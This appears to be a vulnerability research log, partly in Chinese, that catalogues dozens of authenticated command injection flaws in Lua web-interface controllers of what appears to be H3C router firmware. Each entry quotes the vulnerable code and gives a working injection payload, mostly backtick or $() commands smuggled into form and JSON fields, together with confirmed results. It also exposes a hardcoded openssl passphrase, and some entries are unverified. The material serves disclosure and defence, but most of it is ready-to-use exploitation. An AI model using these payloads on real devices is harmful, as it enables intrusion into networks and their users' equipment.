## ID:  1 

### setUserIsolation函数

#### Location: 

advancedfeatures.lua

#### Description: 

command injection after login

#### Vulnerability code :

```
function setUserIsolation()
	local utl = require "luci.util"
	local isolationStatus = luci.http.formvalue('isolationStatus')
	local psStr = '/sbin/h3cisolate ' .. isolationStatus
	utl.execl(psStr) ---------------------------------->here

	luci.http.prepare_content('application/json')
	luci.http.write_json(true)
end
```

#### key attack vector

```
isolationStatus=zh-cn;ifconfig>/advancedfeatures_vul 
```

#### Result:

```
A file named "advancedfeatures_vul" occur in "/" and the content is the result of cmd "ifconfig".
```





## ID:  2

### setRRM函数

#### Location: 

advancedfeatures.lua

#### Description: 

command injection after login

#### Vulnerability code :

```
function setRRM()
	local json = require "luci.json"
	local RRMDatas = luci.http.formvalue("RRMData")
	local data = json.decode(RRMDatas)
	local rrmStatus = data.RRMStatus
	[...]

	local string = 'sed -i "s/GlobalStart@1 '.."'"..oldOption.."'".."/GlobalStart@1 '"..rrmStatus.."'/g"..'" /etc/config/h3crrm'
	os.execute(string..';'..'sleep 2')  ----------------->here
```

#### key attack vector

```
    data = {
        "RRMStatus":"`ifconfig>/setRRM_vul`"
    }
```

#### Result:

```
A file named "setRRM_vul" occur in "/" and the content is the result of cmd "ifconfig".
```



## ID:  3  

### addDomainList函数

#### Location: 

advancedfeatures.lua

#### Description: 

command injection after login  through "domainDataInfo.domainData" 

#### Vulnerability code :

```
function addDomainList()
	local uci = luci.model.uci.cursor();
	local utl = require "luci.util"
	local cjson = require "luci.json"
	local domainDataInfo = cjson.decode(luci.http.formvalue('domainData'))

    -- local domainDataInfo = luci.http.formvalue('domainData')
	-- local domainData = strSplit(domainDataInfo, ",")
	local ret = {}
	local commandStr= "'"..domainDataInfo.domainDes.."'"
	if domainDataInfo.denyFlag == '1' then
	  ret = utl.execl("h3chostacl denyrule add \"" ..domainDataInfo.domainData .. "\"") ------>here
```


```

#### key attack vector

```
    data = {
        "domainDes":"`ifconfig>/domainDataInfo_domainDes_vul`",
        "denyFlag":"1",
        "domainData":"`ifconfig>/domainDataInfo_domainData_vul`"
    }
```

#### Result:

```
A file named "domainDataInfo_domainData_vul" occur in "/" and the content is the result of cmd "ifconfig".
```



## ID:  4 

### delDomainList函数

#### Location: 

advancedfeatures.lua

#### Description: 

command injection after login  through "deleData" 

#### Vulnerability code :

```
function delDomainList()
	local utl = require "luci.util"
	local uci = luci.model.uci.cursor();
	local deleData=luci.http.formvalue('deleData')
	local delDataInfo = strSplit(deleData,',')
	local allCheckedFlag = delDataInfo[#delDataInfo-1]
	local radioFlag = delDataInfo[#delDataInfo]
	table.remove(delDataInfo)
	table.remove(delDataInfo)
	if allCheckedFlag == '1' then
	   if radioFlag == '1' then
		  utl.execl("h3chostacl denyrule clean")
	   elseif radioFlag == '0' then
	          if #delDataInfo>1 then
				  utl.execl("h3chostacl freerule clean")
			  elseif #delDataInfo == 1 then
				 for _,item in ipairs(delDataInfo) do
				  utl.execl("h3chostacl freerule delete \"" .. item .. "\"")-------->here
                  elseif allCheckedFlag == '0' then
	     if radioFlag == '1' then
            for _,item in ipairs(delDataInfo) do
		      utl.execl("h3chostacl denyrule delete \"" ..item .. "\"")-------->here
			  uci:commit('lvzhoudenylist');
			end
```

#### key attack vector

```
deleData=`ifconfig>/deleData_vul`,0,1
```

#### Result:

```
A file named "deleData_vul" occur in "/" and the content is the result of cmd "ifconfig".
```







## ID:  5 

### vpnChange函数

#### Location: 

advancedfeatures.lua

#### Description: 

command injection after login  through "submitData" 

#### Vulnerability code :

```
function vpnChange()
	local util = require "luci.util"
	local uci = luci.model.uci.cursor()
	local cjson = require "luci.json"
	local submitData = cjson.decode(luci.http.formvalue("submitData"))
	local oldName = submitData.oldName
	local changeCfg = ''
	local status = util.execl('h3cvpn state "' .. oldName .. '";')[1] or '-'   ---------------->here

```

#### key attack vector

```
    data = {
        "oldName":"`ifconfig>/oldName_vul`",
    }
```

#### Result:

```
A file named "oldName_vul" occur in "/" and the content is the result of cmd "ifconfig".
```





## ID:  6

### vpnBatchDel函数

#### Location: 

advancedfeatures.lua

#### Description: 

command injection after login  through "indexList" 

#### Vulnerability code :

```
function vpnBatchDel()
	local util = require "luci.util"
	local uci = luci.model.uci.cursor()
	local cjson = require "luci.json"
	local indexList = cjson.decode(luci.http.formvalue("indexList"))
	local tunnelList = uci:get('ipsec', 'vpn', 'tunnel')
	
	for _, index in ipairs(indexList) do
		local ike = 'ike' .. index
		local sa = 'sa' .. index
		local status = util.execl('h3cvpn state ' .. index .. ';')[1]----------------> here
```


#### key attack vector

```
    data = [1, 2, "`ifconfig>/vpnBatchDel_vul`"]

    import json
    decoded_str = json.dumps(data)
```

#### Result:

```
A file named "vpnBatchDel_vul" occur in "/" and the content is the result of cmd "ifconfig".
```





## ID:  7

### checkReset函数

#### Location: 

advancedfeatures.lua

#### Description: 

command injection after login  through "resetItem" 

#### Vulnerability code :

```
function checkReset(resetItem)
	local utl = require "luci.util"
	local resetStr = '/sbin/h3creset ' .. resetItem .. 'check'
	local checkData = utl.execl(resetStr)--------------->here
	
	luci.http.prepare_content('application/json')
	luci.http.write_json(checkData)
end

```

#### key attack vector

```
`ifconfig>checkReset_vul`
```

#### Result:

```
A file named "checkReset_vul" occur in "/www/luci" and the content is the result of cmd "ifconfig".
```







## ID:  8 9 10 (later)

### writeVerCfg函数

#### Location: 

apmanage.lua

#### Description: 

command injection after login  through "apVersionData.versionNumber"  "apVersionData.versionDescribe" "apVersionData.versionFileSize"

#### Vulnerability code :

```
function writeVerCfg()
	local util = require "luci.util"
	local cjson = require "luci.json"
	local system = require "luci.controller.admin.system"
	local uci = luci.model.uci.cursor()
	local devModelsList = {}
	local apVersionData = cjson.decode(luci.http.formvalue('apVersionData'))
	
	local apVersionFileName =  apVersionData.versionFileName
	local apVersionNumber =  apVersionData.versionNumber
	local apVersiondDescribe =  apVersionData.versionDescribe
	local apVersionFileSize =  apVersionData.versionFileSize
	
	devModelsList = apVersionData.apModels
	
	local devModelList = ""
	local devName = {}

	for i = 1, #devModelsList, 1 do
		if devModelsList[i] ~= "#" then
			devModelList = devModelList .. "#" .. devModelsList[i]
			table.insert(devName, devModelsList[i])
		end
	end
	devModelList = string.sub(devModelList,2)


	local md5Cmd = "md5sum /tmp/ApVersion/" .. apVersionFileName
	local Md5Str = util.execl(md5Cmd)
	local Md5Value = strSplit(Md5Str[1], " ")
	local h3cMvCapwapApImgCmd = "/sbin/h3cmvcapwapapimg '" .. apVersionNumber .. "' '" .. devModelList .. "' '" .. apVersionFileSize .. "' '" .. Md5Value[1] .. "' '" .. apVersionFileName .. "' '" .. apVersiondDescribe .."'"
	util.execl(h3cMvCapwapApImgCmd) ---------------->here

```

#### key attack vector

```
    data = {
        "versionFileName":"fuzz.sh",
        "versionNumber":"`ifconfig>/versionNumber_vul`",
        "versionDescribe":"`ifconfig>/versionDescribe_vul`",
        "versionFileSize":"`ifconfig>/versionFileSize_vul`",
        "apModels":["1","2","2"]
    }

```

#### Result:

```
A file named "versionNumber_vul" "versionDescribe_vul" "versionFileSize_vul "occur in "/" and the content is the result of cmd "ifconfig".
```



## ID:  11    12  (later)  不是漏洞

we make sure it is a cmd injection vul, but the poc_burp is not copied here.

### changeApVersion函数

#### Location: 

apmanage.lua

#### Description: 

command injection after login  through "apVersionData.versionFileName"  "apVersionData.versionNumber"

#### Vulnerability code :

```
function changeApVersion()
	local uci = luci.model.uci.cursor()
	local util = require "luci.util"
	local cjson = require "luci.json"
	local system = require "luci.controller.admin.system"
	local apVersionData = cjson.decode(luci.http.formvalue('apVersionData'))
	local verName
	local devModelLists
	util.execl("cp /img/APSoftinfo /etc/config/APSoftinfo")
	[...]
	local devVersionData = '{"model":"' .. devModelList .. '","name":"' .. apVersionData.versionFileName .. '","version":"' .. apVersionData.versionNumber .. '"}'
	
	local changeApImageUbusCmd = "ubus call capwap modify_apimage '" .. devVersionData .. "'"
	system.fork_exec(changeApImageUbusCmd)--->here
```

#### by pass

by pass "devModelLists" check

	devModelLists = uci:get('APSoftinfo', sectionName, 'devname')
	
		local devModelList = ""
		for i = 1, #devModelLists, 1 do
			devModelList = devModelList .. "#" .. devModelLists[i]
		end
		devModelList = string.sub(devModelList,2) ---->here

so the vul can be used when we know 

```
devModelLists = uci:get('APSoftinfo', sectionName, 'devname')
```

```
uci show APSoftinfo
```

#### Result:

```
A file named "changeApVersion_versionNumber_vul" "changeApVersion_versionFile_vul" occur in "/" and the content is the result of cmd "ifconfig".
```




## ID:  13-17

### networktoolPing函数

#### Location: 

networktool.lua

#### Description: 

command injection after login  through:

"pingCfg.times"

"pingCfg.timeout"

"pingCfg.sizes"

"pingCfg.ip"

#### Vulnerability code :

```
	local pingCmd = "ping -c" .. " " .. pingCfg.times .." " .. "-W" .. " " .. pingCfg.timeout .. " " .. "-s" .. " " .. pingCfg.sizes .. " " .. pingCfg.ip .. " " .. "> /tmp/ping.txt 2\>\&1 &"
	local pingMsg = "echo ping -c " .. pingCfg.times .." -W " .. pingCfg.timeout .. " -s " .. pingCfg.sizes .. " " .. pingCfg.ip .. " > /tmp/pingMsg.log"
	
	utl.execl(pingMsg)
	utl.execl(pingCmd)
```


#### key attack vector

```
data = {"times":"$(ifconfig>/111_vul)","timeout":"`ifconfig>/5g_vul`","sizes":"`ifconfig>/6g_vul`","ip":"`ifconfig>/7g_vul`"}
```

#### Result:

```
A file named "111_vul","5g_vul","6g_vul","7g_vul" occur in "/" and the content is the result of cmd "ifconfig".
```





## ID:  18

### wifiSwitchChange函数

#### Location: 

wificfg.lua

#### Description: 

command injection after login

#### Vulnerability code :

```
	local execlString = "h3cst2wireless "..wifiName
	utl.execl(execlString)
```


#### key attack vector

```
    data = {
        "name":"$(ifconfig>/wificfg_name_vul)",
        "status":"1"
    }
```

#### Result:

```
A file named "wificfg_name_vul" occur in "/" and the content is the result of cmd "ifconfig".
```



## ID:  19

### wifisubmit函数

#### Location: 

wificfg.lua

#### Description: 

command injection after login  through "submitData.name" 

#### Vulnerability code :

```
	local execlString = "h3cst2wireless "..submitData.name
	utl.execl(execlString)
```



#### key attack vector

```
    data = {
        "name":"$(ifconfig>/wificfg_subnmit_name_vul)",
        "status":"1"
    }
```

#### Result:

```
A file named "wificfg_subnmit_name_vul" occur in "/" and the content is the result of cmd "ifconfig".
```


## ID: 20

### vpnBatchConn函数

#### Location: 

advancedfeatures.lua（推测，与 vpnChange/vpnBatchDel 同文件）

#### Vulnerability code :

```
function vpnBatchConn()
	local util = require "luci.util"
	local cjson = require "luci.json"
	local uci = luci.model.uci.cursor()
	local connData = cjson.decode(luci.http.formvalue("connData"))
	local utilStr = "h3cvpn upall "
	local indexStr = "'"

	for _, index in ipairs(connData.indexList) do
		local status = util.execl('h3cvpn state ' .. index .. ';')[1]
		local name = uci:get('ipsec', index, 'name')
		local isFailedName = false
		...
	end
	...
	if indexStr ~= "'" then
		indexStr = string.sub(indexStr, 1, -2) .. "'"
		utilStr = utilStr .. indexStr
		io.popen(utilStr)
	end
end
```

#### key attack vector

```
data = {
    "indexList": ["1", "`ifconfig>/vpnBatchConn_vul`"],
    "failedNameList": []
}
```

#### Result:

```
A file named "vpnBatchConn_vul" occur in "/" and the content is the result of cmd "ifconfig".
```

## ID: 21

### vpnBatchDisconn函数

#### Location: 

advancedfeatures.lua（推测）

#### Vulnerability code :

```
function vpnBatchDisconn()
	local util = require "luci.util"
	local cjson = require "luci.json"
	local indexList = cjson.decode(luci.http.formvalue("indexList"))
	local utilStr = 'h3cvpn downall '
	local indexStr = "'"

	for _, index in ipairs(indexList) do
		local status = util.execl('h3cvpn state ' .. index .. ';')[1]
		if status == '1' or status == '2' then
			indexStr = indexStr .. index .. ' '
		end
	end
	...
	if indexStr ~= "'" then
		indexStr = string.sub(indexStr, 1, -2) .. "'"
		utilStr = utilStr .. indexStr
		io.popen(utilStr)
	end
end
```

#### key attack vector

```
data = ["1", "`ifconfig>/vpnBatchDisconn_vul`"]
```

#### Result:
```
A file named "vpnBatchDisconn_vul" occur in "/" and the content is the result of cmd "ifconfig".
```


## ID: 22

### deleteApVersion函数

#### Location: 

apmanage.lua（推测）

#### Vulnerability code :

```
function deleteApVersion()
	local uci = luci.model.uci.cursor()
	local util = require "luci.util"
	local cjson = require "luci.json"
	local system = require "luci.controller.admin.system"
	local apVersionNumber = cjson.decode(luci.http.formvalue('apVersionNumberData'))
	...
	util.execl("cp /img/APSoftinfo /etc/config/APSoftinfo")
	uci:foreach('APSoftinfo', 'image', function(cfg)
		local sectionName = cfg['.name']
		local version = uci:get('APSoftinfo', sectionName, 'imgname')
		if version == apVersionNumber.apVersionNumber then
			verName = uci:get('APSoftinfo', sectionName, 'imgname')
			devModel = uci:get('APSoftinfo', sectionName, 'devname')
			uci:delete('APSoftinfo', sectionName)
		end
	end)
	...
	local delApImageUbusCmd = "ubus call capwap del_apimage '" .. devVersionData .. "'"
	system.fork_exec(delApImageUbusCmd)
	local versionRmCmd = "rm -rf /img/" .. verName
	util.execl(versionRmCmd)
end
```

#### key attack vector

```
待验证
```

#### Result:

```
待验证
```

## ID: 23

### upgradeApVersion函数

#### Location: 

apmanage.lua（推测）

#### Vulnerability code :

```
function upgradeApVersion()
	...
	local devVersionData = '{"model":"' .. devModelList .. '"}'
	local upgradeVersionUbusCmd = "ubus call capwap kick_ap '" .. devVersionData .. "'"
	system.fork_exec(upgradeVersionUbusCmd)
end
```

#### key attack vector

```
待验证
```

#### Result:

```
待验证
```

## ID: 24

### changeServiceTemplate函数

#### Location: 

wificfg.lua 或 advancedfeatures.lua（推测）

#### Vulnerability code :

```
function changeServiceTemplate()
	...
	local serviceTemplateData = '{"id":"'.. serverTemplateData.index .. '", "ssid":"'.. serverTemplateData.ssid .. '","encrypt":"'.. serverTemplateData.encrypt .. '","psk":"'.. serverTemplateData.key .. '","disabled":"'.. serverTemplateData.disabled .. '", "hidden":' .. serverTemplateData.hidden .. ', "vlan":"' .. serverTemplateData.vlan .. '","RadioBind":"'..serverTemplateData.BindRadio.. '"' ..LimitSpeed ..'}'
	local serviceTemplateUbusCmd = "ubus call capwap service_template '" .. serviceTemplateData .. "'"
	system.fork_exec(serviceTemplateUbusCmd)
end
```

#### key attack vector

```
data = {
    "index": "1",
    "ssid": "`ifconfig>/changeServiceTemplate_vul`",
    "encrypt": "none",
    "key": "",
    "disabled": "0",
    "hidden": false,
    "vlan": "1",
    "BindRadio": "1",
    "speedLimit": {...}
}
```

#### Result:

```
待验证
```

## ID: 25

### apBinding函数

#### Location: 

apmanage.lua（推测）

#### Vulnerability code :

```
function apBinding()
	local cjson = require "luci.json"
	local system = require "luci.controller.admin.system"
	local util = require "luci.util"
	local apBindingList = cjson.decode(luci.http.formvalue('apBindingList'))
	...
	local apList = '{"id":"'.. bindSsidServerTemplate ..'","bind":"'.. apMacListBind .. '","unbind":"'.. apMacListUnbind .. '"}'
	local apListBindUbusCmd = "ubus call capwap bind '" .. apList .. "'"
	util.execl("echo 0 > /tmp/bindflag")
	system.fork_exec(apListBindUbusCmd)
end
```

#### key attack vector

```
data = {
    "ssidServerTemplate": "1",
    "list": {
        "`ifconfig>/apBinding_vul`": 1
    }
}
```

#### Result:

```
A file named "apBinding_vul" occur in "/" and the content is the result of cmd "ifconfig".
```

## ID: 26

### changeApMsg函数

#### Location: 

apmanage.lua（推测）

#### Vulnerability code :

```
function changeApMsg()
	local util = require "luci.util"
	local cjson = require "luci.json"
	local system = require "luci.controller.admin.system"
	local apMsg = cjson.decode(luci.http.formvalue('apMsg'))
	...
	local apMsgStr = '{"name":"' .. apMsg.apName .. '","mac":"' .. apMsg.mac .. '","Isroamconfig":' .. apMsg.roamIsroamconfig ..',"isStaLimitConfig":' .. tonumber(apMsg.isStaLimitConfig) ..  ',"2G":"' .. apMsg.msg2G .. '","5G":"' .. apMsg.msg5G .. '","5G_1":"' .. apMsg.msg5G_1 .. '",'
	...
	local ubusStr = "ubus call capwap radio '" .. apMsgStr .. "'"
	system.fork_exec(ubusStr)
end
```

#### key attack vector

```
data = {
    "apName": "`ifconfig>/changeApMsg_vul`",
    "mac": "00:11:22:33:44:55",
    "roamIsroamconfig": 1,
    "isStaLimitConfig": "1",
    "msg2G": "1",
    "msg5G": "1",
    "msg5G_1": "1",
    "lanCount": 1,
    "vlanList": {"vlanEth1": "1"}
}
```

#### Result:

```
A file named "changeApMsg_vul" occur in "/" and the content is the result of cmd "ifconfig".
```

## ID: 27

### deleteAplist函数

#### Location: 

apmanage.lua（推测）

#### Vulnerability code :

```
function deleteAplist()
	local util = require "luci.util"
	local cjson = require "luci.json"
	local system = require "luci.controller.admin.system"
	local apDeleteList = cjson.decode(luci.http.formvalue('apDeleteList'))
	local deleteMacMsg = ''
	for index, apDeleteMac in ipairs(apDeleteList) do
		if index ~= #apDeleteList then
			deleteMacMsg = deleteMacMsg .. apDeleteMac .. '#'
		else
			deleteMacMsg = deleteMacMsg .. apDeleteMac
		end
	end
	local deleteMacStr = '{"mac":"' .. deleteMacMsg .. '"}'
	local ubusStr = "ubus call capwap delete_aplist '" .. deleteMacStr .. "'"
	util.execl('echo 0 > /tmp/delete_aplist_flag')
	system.fork_exec(ubusStr)
end
```

#### key attack vector

```
data = ["`ifconfig>/deleteAplist_vul`"]
```

#### Result:

```
A file named "deleteAplist_vul" occur in "/" and the content is the result of cmd "ifconfig".
```

## ID: 28

### getApCfg函数

#### Location: 

apmanage.lua（推测）

#### Vulnerability code :

```
function getApCfg()
	local util = require "luci.util"
	local cjson = require "luci.json"
	local system = require "luci.controller.admin.system"
	local apMacList = cjson.decode(luci.http.formvalue('apMacList'))
	local macStr = ''
	for index, apMac in ipairs(apMacList) do
		if index == #apMacList then
			macStr = macStr .. apMac
		else
			macStr = macStr .. apMac .. '#'
		end
	end
	local ubusCmdStr = 'ubus call capwap collect_info \'{"mac":"' .. macStr .. '","count":"' .. #apMacList .. '"}\''
	system.fork_exec(ubusCmdStr)
end
```

#### key attack vector

```
data = ["`ifconfig>/getApCfg_vul`"]
```

#### Result:

```
A file named "getApCfg_vul" occur in "/" and the content is the result of cmd "ifconfig".
```

## ID: 29

### aplistReboot函数

#### Location: 

apmanage.lua（推测）

#### Vulnerability code :

```
function aplistReboot()
	local util = require "luci.util"
	local cjson = require "luci.json"
	local system = require "luci.controller.admin.system"
	local apMacList = cjson.decode(luci.http.formvalue('apMacList'))
	local macStr = ''
	for index, apMac in ipairs(apMacList) do
		if index == #apMacList then
			macStr = macStr .. apMac
		else
			macStr = macStr .. apMac .. '#'
		end
	end
	local ubusCmdStr = 'ubus call capwap reboot_aplist \'{"mac":"' .. macStr .. '"}\''
	util.execl('echo 0 > /tmp/APRebootFlag')
	system.fork_exec(ubusCmdStr)
	...
end
```

#### key attack vector

```
data = ["`ifconfig>/aplistReboot_vul`"]
```

#### Result:

```
A file named "aplistReboot_vul" occur in "/" and the content is the result of cmd "ifconfig".
```

## ID: 30

### aplistReset函数

#### Location: 

apmanage.lua（推测）

#### Vulnerability code :

```
function aplistReset()
	local util = require "luci.util"
	local cjson = require "luci.json"
	local apMacList = cjson.decode(luci.http.formvalue('apMacList'))
	local macStr = ''
	for index, apMac in ipairs(apMacList) do
		if index == #apMacList then
			macStr = macStr .. apMac
		else
			macStr = macStr .. apMac .. '#'
		end
	end
	local ubusCmdStr = 'ubus call capwap clearconfig_aplist \'{"mac":"' .. macStr .. '"}\''
	util.execl('echo 0 > /tmp/APClearConfigFlag')
	util.execl(ubusCmdStr)
	...
end
```

#### key attack vector

```
data = ["`ifconfig>/aplistReset_vul`"]
```

#### Result:

```
A file named "aplistReset_vul" occur in "/" and the content is the result of cmd "ifconfig".
```

## ID: 31

### changeSetHideManage函数

#### Location: 

advancedfeatures.lua（推测）

#### Vulnerability code :

```
function changeSetHideManage ()
	local util = require "luci.util"
	local cjson = require "luci.json"
	local HideStatus= cjson.decode(luci.http.formvalue('HideStatus'))
	local ubusCmd = 'ubus call capwap hide_manage \'{"hide":"' .. HideStatus.HideStatus .. '"}\''
	util.execl(ubusCmd)
	...
end
```

#### key attack vector

```
data = {
    "HideStatus": "`ifconfig>/changeSetHideManage_vul`"
}
```

#### Result:

```
A file named "changeSetHideManage_vul" occur in "/" and the content is the result of cmd "ifconfig".
```

## ID: 32

### changeCapwapStatus函数

#### Location: 

advancedfeatures.lua（推测）

#### Vulnerability code :

```
function changeCapwapStatus ()
	local util = require "luci.util"
	local cjson = require "luci.json"
	local capwapOpen= cjson.decode(luci.http.formvalue('capwapOpen'))
	util.execl('ubus call capwap capwap_disabled \'{"disabled":"' .. capwapOpen.capwapOpen .. '"}\'')
	...
end
```

#### key attack vector

```
data = {
    "capwapOpen": "`ifconfig>/changeCapwapStatus_vul`"
}
```

#### Result:

```
A file named "changeCapwapStatus_vul" occur in "/" and the content is the result of cmd "ifconfig".
```

## ID: 33

### changeRadioMode函数

#### Location: 

advancedfeatures.lua（推测）

#### Vulnerability code :

```
function changeRadioMode ()
	local util = require "luci.util"
	local cjson = require "luci.json"
	local radioModeData = cjson.decode(luci.http.formvalue('radioModeData'))
	local radioMode2G = radioModeData.wirelessMode2G
	local radioMode5G = radioModeData.wirelessMode5G
	util.execl('ubus call capwap setApRadioType \'{"2g":'..radioMode2G..',"5g":'.. radioMode5G..'}\'')
	...
end
```

#### key attack vector

```
data = {
    "wirelessMode2G": "`ifconfig>/changeRadioMode_vul`",
    "wirelessMode5G": "1"
}
```

#### Result:

```
A file named "changeRadioMode_vul" occur in "/" and the content is the result of cmd "ifconfig".
```

## ID: 34

### setAdvancedcfg函数

#### Location: 

advancedfeatures.lua（推测）

#### Vulnerability code :

```
function setAdvancedcfg()
	...
	local advancedcfg = cjson.decode(luci.http.formvalue('advancedcfg'))
	local RssiString = ""
	for i, value in ipairs(advancedcfg.rssiData) do
		local strings = 'RejectStatus '..value.RejectStatus..' RejectVal '..value.RejectVal..' ReconStatus '..value.ReconStatus..' ReconVal '..value.ReconVal
		if i==1 then
			RssiString = 'ubus call capwap setApRssiInfo \'{"2G":"'..strings..'",'
		else
			RssiString = RssiString..'"5G":"'..strings..'"}\''
		end
	end
	util.execl(RssiString)
	...
end
```

#### key attack vector

```
data = {
    "rssiData": [
        {
            "RejectStatus": "`ifconfig>/setAdvancedcfg_vul`",
            "RejectVal": "1",
            "ReconStatus": "1",
            "ReconVal": "1"
        }
    ]
}
```

#### Result:

```
A file named "setAdvancedcfg_vul" occur in "/" and the content is the result of cmd "ifconfig".
```

## ID: 35

### apLedChange函数

#### Location: 

advancedfeatures.lua（推测）

#### Vulnerability code :

```
function apLedChange()
	...
	local LedStatus= cjson.decode(luci.http.formvalue('ledopenVal'))
	local setLedStatus = LedStatus.ledopen	
	local apLedStatus = uci:get("capwap","ac","apledswitch")
	if setLedStatus ~= apLedStatus then
		system.fork_exec('ubus call capwap apledswitch \'{"enable":"' .. setLedStatus .. '"}\'')
	end
	...
end
```

#### key attack vector

```
data = {
    "ledopen": "`ifconfig>/apLedChange_vul`"
}
```

#### Result:

```
A file named "apLedChange_vul" occur in "/" and the content is the result of cmd "ifconfig".
```

## ID: 36

### apRrmChgange函数

#### Location: 

advancedfeatures.lua（推测）

#### Vulnerability code :

```
function apRrmChgange()
	...
	local rrmStatus= cjson.decode(luci.http.formvalue('rrmOpenVal'))
	local setrrmStatus = rrmStatus.rrmOpen	
	local apRrmStatus = uci:get("capwap","ac","optimize")
	if setrrmStatus ~= apRrmStatus then
		system.fork_exec('ubus call capwap optimize \'{"enable":"' .. setrrmStatus .. '"}\'')
	end
	...
end
```

#### key attack vector

```
data = {
    "rrmOpen": "`ifconfig>/apRrmChgange_vul`"
}
```

#### Result:

```
A file named "apRrmChgange_vul" occur in "/" and the content is the result of cmd "ifconfig".
```

## ID: 37

### steGlobalRoamData函数

#### Location: 

advancedfeatures.lua（推测）

#### Vulnerability code :

```
function steGlobalRoamData()
	local log = require "luci.log"
	local util = require "luci.util"
	local gRoamData = luci.http.formvalue('gRoamData')
	util.execl("ubus call capwap setRoaminfo '" .. gRoamData .. "'")
	...
end
```

#### key attack vector

```
gRoamData=`ifconfig>/steGlobalRoamData_vul`
```

#### Result:

```
A file named "steGlobalRoamData_vul" occur in "/" and the content is the result of cmd "ifconfig".
```

## ID: 38

### encryptCode函数

#### Location: 

公共库文件（推测）

#### Vulnerability code :

```
function encryptCode (params)
	local util = require "luci.util"
	local chipTypes = publicCheckChip()
	local result
	if chipTypes == "mtk" then
		result = util.execl("echo " .. params .. "| openssl aes-128-cbc -d -a -A -pass pass:\"5paw5Y2O5LiJ56eY6ZKl\" -p")
	else
		result = util.execl("echo " .. params .. "| openssl aes-128-cbc -d -a -A -pass pass:\"5paw5Y2O5LiJ56eY6ZKl\" -p -md md5 ")
	end
	return result[4]
 end
```

#### key attack vector

```
params=`ifconfig>/encryptCode_vul`
```

#### Result:

```
A file named "encryptCode_vul" occur in "/" and the content is the result of cmd "ifconfig".
```

## ID: 39

### action_sysupgrade函数

#### Location: 

system.lua 或 flashops.lua（推测）

#### Vulnerability code :

```
function action_sysupgrade()
	local fs = require "nixio.fs"
	local http = require "luci.http"
	local image_tmp = "/tmp/firmware.img"
	...
	elseif step == 2 then
		local keep = (http.formvalue("keep") == "1") and "" or "-n"
		...
		fork_exec("sleep 1; killall dropbear uhttpd; sleep 1; /sbin/sysupgrade %s %q" %{ keep, image_tmp })
	end
end
```

#### key attack vector

```
待验证
```

#### Result:

```
待验证
```

## ID: 40

### do_upgrade函数

#### Location: 

system.lua 或 flashops.lua（推测）

#### Vulnerability code :

```
function do_upgrade()
	...
	if deviceType == "CLOUDGW" then
		local stopUpgradeAp = '{"stopUpgradeAP":"1"}'
		local stopUpgradeApCmd = "ubus call capwap stop_imgdownload '" .. stopUpgradeAp .."'"
		system.fork_exec(stopUpgradeApCmd)
	end
	...
end
```

#### key attack vector

```
待验证
```

#### Result:

```
待验证
```

## ID: 41

### addVlan函数

#### Location: 

vlan 相关控制器（推测）

#### Vulnerability code :

```
function addVlan()
	...
	local vlanconfstr='h3cssidvlanconfig add ' ..vlanData.vlanId
	io.popen(vlanconfstr)
	...
	local vlanbridgename='br-'..vlanName
	local vlanbridgeubusData = '{"action":"add", "bridgename":"' .. vlanbridgename .. '"}'
	local vlanbridgeubusStr = "ubus call oauthbridgecfg bridgeupdate '" .. vlanbridgeubusData .. "'"
	io.popen(vlanbridgeubusStr)
end
```

#### key attack vector

```
data = {
    "vlanId": "`ifconfig>/addVlan_vul`",
    "vlanName": "`ifconfig>/addVlan_name_vul`"
}
```

#### Result:

```
A file named "addVlan_vul" "addVlan_name_vul" occur in "/" and the content is the result of cmd "ifconfig".
```

## ID: 42

### deleteVlan函数

#### Location: 

vlan 相关控制器（推测）

#### Vulnerability code :

```
function deleteVlan()
	...
	uci:delete('dhcp',vlanDelName)
	local vlanconfstr='h3cssidvlanconfig remove ' ..vlanDelId
	io.popen(vlanconfstr)	
	local vlanbridgename='br-'..vlanDelName
	local vlanbridgeubusData = '{"action":"remove", "bridgename":"' .. vlanbridgename .. '"}'
	local vlanbridgeubusStr = "ubus call oauthbridgecfg bridgeupdate '" .. vlanbridgeubusData .. "'"
	io.popen(vlanbridgeubusStr)
	uci:commit('system')
end
```

#### key attack vector

```
data = {
    "vlanDelId": "`ifconfig>/deleteVlan_vul`",
    "vlanDelName": "`ifconfig>/deleteVlan_name_vul`"
}
```

#### Result:

```
A file named "deleteVlan_vul" "deleteVlan_name_vul" occur in "/" and the content is the result of cmd "ifconfig".
```

## ID: 43

### action_bandwidth函数

#### Location: 

status 或 network 相关控制器（推测）

#### Vulnerability code :

```
function action_bandwidth(ifaces)
	local luci_util = require "luci.util"
	local aIfaces = luci_util.split(ifaces, "_")
	local data = {}
	local i
	for i = 1, #aIfaces do
		local iface_index = ""
		local iface = aIfaces[i]
		local bwc = io.popen("luci-bwc -i %q 2>/dev/null" % iface)
		...
	end
end
```

#### key attack vector

```
待验证
```

#### Result:

```
待验证
```

## ID: 44

### getMtkRealtimeTraffic函数

#### Location: 

status 或 network 相关控制器（推测）

#### Vulnerability code :

```
function getMtkRealtimeTraffic(ifaces)
	local luci_util = require "luci.util"
	local data = {}
	local file=io.open("/proc/port_enable","r")
	local statuslinklist = {}
	for line in file:lines() do
		statuslinklist[#statuslinklist+1]= string.sub(line,-1)
	end
	for _, iface in ipairs(ifaces) do
		local isPort = string.find(iface, "wifi")
		local bwc
		local portflag
		if isPort ~= nil then
			bwc = io.popen("luci-bwc -i %q 2>/dev/null" % iface)
			...
		end
	end
end
```

#### key attack vector

```
待验证
```

#### Result:

```
待验证
```
